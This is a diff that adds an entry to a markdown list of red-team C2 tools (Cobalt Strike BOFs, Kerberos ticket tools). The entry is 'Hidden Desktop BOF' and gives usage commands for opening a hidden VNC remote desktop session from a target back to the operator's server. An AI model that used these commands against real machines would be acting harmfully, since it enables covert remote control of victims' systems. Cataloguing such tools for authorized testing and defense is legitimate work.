@@ -253,3 +253,11 @@ Color helper Aggressor script for coloring "help" output based on command type a
 
 - [**nanorubeus**](https://github.com/wavvs/nanorobeus)<br />
 BOF equivalent of Rubeus for managing Kerberos tickets. Sadly it doesn't work in Cobalt Strike but it could be converted if needed. Instead it can be used in other C2s supporting BOF/COFFs such as Sliver and Brute Ratel.<br />
+
+- [**Hidden Desktop BOF**](https://github.com/WKL-Sec/HiddenDesktop)<br />
+Uses VNC connection and server to create a hidden remote desktop connection to your target instead of using RDP. <br />
+```
+Start the HVNC server first
+HiddenDesktop <server> <port> --> Start a hidden desktop client connection to your listening server
+hd-launch-explorer --> Then start the Windows explorer browser which should pop up a new window on your system
+```
